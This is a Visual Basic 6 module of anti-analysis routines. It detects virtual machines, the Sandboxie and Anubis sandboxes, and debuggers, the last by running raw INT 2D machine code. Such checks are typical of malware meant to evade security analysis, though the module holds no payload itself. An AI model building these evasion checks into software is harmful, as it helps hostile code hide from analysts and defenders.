Attribute VB_Name = "Module2"

Private Declare Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Private Declare Function SetUnhandledExceptionFilter Lib "kernel32" (ByVal lpTopLevelExceptionFilter As Long) As Long
Private Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal adr As Long, ByVal p1 As Long, ByVal p2 As Long, ByVal p3 As Long, ByVal p4 As Long) As Long
Private Declare Function GetVolumeInformation Lib "kernel32.dll" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, lpVolumeSerialNumber As Long, lpMaximumComponentLength As Long, lpFileSystemFlags As Long, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Long) As Long
Public bDebug As Boolean


Public Function IsVirtualPCPresent() As Long
    Dim lhKey       As Long
    Dim sBuffer     As String
    Dim lLen        As Long
 
    If RegOpenKeyEx(&H80000002, "SYSTEM\ControlSet001\Services\Disk\Enum", _
       0, &H20019, lhKey) = 0 Then
        sBuffer = Space$(255): lLen = 255
        If RegQueryValueEx(lhKey, "0", 0, 1, ByVal sBuffer, lLen) = 0 Then
            sBuffer = UCase(Left$(sBuffer, lLen - 1))
            Select Case True
                Case sBuffer Like "*VIRTUAL*":   IsVirtualPCPresent = 1
                Case sBuffer Like "*VMWARE*":    IsVirtualPCPresent = 1
                Case sBuffer Like "*VBOX*":      IsVirtualPCPresent = 1
            End Select
        End If
        Call RegCloseKey(lhKey)
    End If
End Function



Function IsSandBoxiePresent(ByVal OptionToCheck As Integer, Optional MainFrm As Form) As Boolean
    Select Case OptionToCheck
        Case 1
            Dim hSbie As Long
 
            hSbie = GetModuleHandle("SbieDll.dll")
            If hSbie <> 0 Then
                IsSandBoxiePresent = True
            Else
                IsSandBoxiePresent = False
            End If
        Case 2
            If InStr(MainFrm.Caption, "[#]") <> 0 Then
                IsSandBoxiePresent = True
            Else
                IsSandBoxiePresent = False
            End If
    End Select
End Function

Public Sub TestDebug()
    On Error Resume Next
    
    Static bInitialized As Boolean
    
    If Not bInitialized Then
        Call SetUnhandledExceptionFilter(AddressOf Handler)
        bInitialized = True
    End If
    
    Dim bvASM(8) As Byte
    
    bvASM(0) = &H58:    bvASM(1) = &H59:    bvASM(2) = &H59:    bvASM(3) = &H59
    bvASM(4) = &H59:    bvASM(5) = &H50:    bvASM(6) = &HCD:    bvASM(7) = &H2D
    bvASM(8) = &HC3
    
    bDebug = True
    Call CallWindowProc(VarPtr(bvASM(0)), 0, 0, 0, 0)

End Sub

Public Function Handler(ByRef ExPtrs As Long) As Long
    bDebug = False: Handler = True
End Function

Function IsAnubisPresent(ByVal OptionToCheck As Integer) As Boolean
    On Error Resume Next
    Select Case OptionToCheck
        Case 1  'Recomendado
            If GetSerialNumber(Environ("SystemDrive") & "\") = "1824245000" Then
                IsAnubisPresent = True
            Else
                IsAnubisPresent = False
            End If
    End Select
End Function
 
Public Function GetSerialNumber(DriveLetter As String) As Long
    Buffer1 = String$(255, Chr$(0))
    Buffer2 = String$(255, Chr$(0))
    Res = GetVolumeInformation(DriveLetter, Buffer1, Len(Buffer1), SerialNum, 0, 0, Buffer2, Len(Buffer2))
    GetSerialNumber = SerialNum
End Function

